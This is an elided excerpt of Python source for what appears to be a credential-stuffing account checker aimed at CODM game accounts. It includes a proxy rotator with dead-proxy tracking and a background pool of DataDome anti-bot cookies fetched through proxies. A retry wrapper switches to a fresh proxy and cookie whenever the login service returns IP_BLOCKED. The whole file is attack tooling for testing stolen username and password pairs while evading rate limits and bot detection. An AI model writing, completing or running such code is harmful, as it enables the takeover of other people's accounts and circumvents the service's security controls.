...
- Proxy rotator (proxies.txt) with dead-proxy tracking + auto-reset
- Self-fetching datadome cookie pool through proxies
...
# ══════════════════════════════════════════════════════════════════════
# PROXY ROTATOR — round-robin with dead-proxy tracking
# ══════════════════════════════════════════════════════════════════════

class ProxyRotator:
    """
    Wraps shamp.ProxyManager with dead-proxy tracking.
    - get(): returns next proxy, skipping known-dead ones
    - mark_failed(): blacklists a proxy until the whole pool cycles
    - auto-reset: when every proxy is dead, clears failed set and resumes
    """
    ...
    def get(self):
        ...
        with self.lock:
            ...
            # All dead — reset and cycle again
            self.failed.clear()
            idx = self._index % total
            self._index += 1
            self._fetches += 1
...
# ══════════════════════════════════════════════════════════════════════
# COOKIE POOL — background-refreshed, proxy-aware
# ══════════════════════════════════════════════════════════════════════
...
class CookiePool:
            ...
            try:
                ...
                if need > 0:
                    ...
                    try:
                        ...
                        dd = shamp.get_datadome_cookie(s, proxies=proxy)
                    finally:
                        s.close()
                    if dd:
                        with self.lock:
    ...
    def get(self):
        ...
        # Sync fallback through the rotator
        try:
            proxy = proxy_rotator.get() if proxy_rotator else None
            s = requests.Session()
            if proxy:
...
# ══════════════════════════════════════════════════════════════════════
# CODM DETECTION — shop roles primary, legacy chain fallback
# ══════════════════════════════════════════════════════════════════════
...
def _attempt_check(account: str, password: str, cookie_value,
                   proxy_dict) -> dict:
    """Single attempt with a fixed proxy. Never raises."""
    r = {
...
def check_single(account: str, password: str, cookie_value) -> dict:
    """
    Rotating wrapper. Retries through fresh proxies on IP_BLOCKED.
    Returns the last result if all attempts fail.
    """
    ...
    for attempt in range(max_attempts):
        ...
        # Only IP_BLOCKED triggers rotation.
        if err != 'IP_BLOCKED':
            return result
        ...
        # Grab a fresh cookie for the next attempt — blocked one is poisoned
...
def main():
    ...
    if proxy_rotator.enabled:
        ...
        logger.warning('No proxies loaded — running direct from local IP. '
                       'Expect IP_BLOCKED unless your IP is clean.')
